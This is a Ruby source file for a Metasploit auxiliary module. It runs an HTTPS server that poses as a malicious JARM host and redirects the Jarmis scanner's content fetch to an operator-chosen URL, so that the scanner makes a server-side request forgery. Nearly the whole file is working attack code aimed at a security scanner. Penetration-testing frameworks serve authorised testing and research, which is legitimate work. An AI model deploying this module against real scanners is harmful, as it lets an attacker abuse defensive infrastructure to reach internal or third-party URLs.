##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Auxiliary::Report

  def initialize(info={})
    super(update_info(info,
      'Name'        => 'Redirect Jarmis Scanner to something else',
      'Description'    => %q{
        The Jarmis Scanner will try to collect content from a server it detects as a known
        malicious JARM. MSF is that, and therefore this module will redirect that last request
        to some other url for SSRF.
      },
      'Author'      => ['usuario'],
      'License'     => MSF_LICENSE,
      'Actions'     =>
        [
          [ 'Redirect', 'Description' => 'Run redirect web server' ]
        ],
      'PassiveActions' =>
        [
          'Redirect'
        ],
      'DefaultAction'  => 'Redirect'
    ))

    register_options(
      [
        OptPort.new('SRVPORT', [ true, "The local port to listen on.", 443 ]),
        OptString.new('RedirectURL', [ true, "The page to redirect users to" ]),
        OptBool.new('SSL', [ true, "Negotiate SSL for incoming connections", true])
      ])
  end

  # Not compatible today
  def support_ipv6?
    false
  end

  def run
    @myhost   = datastore['SRVHOST']
    @myport   = datastore['SRVPORT']

    exploit
  end

  def on_request_uri(cli, req)
    if datastore['RedirectURL']
      print_status("Redirecting client #{cli.peerhost} to #{datastore['RedirectURL']}")
      send_redirect(cli, datastore['RedirectURL'])
    else
      send_not_found(cli)
    end
  end
end

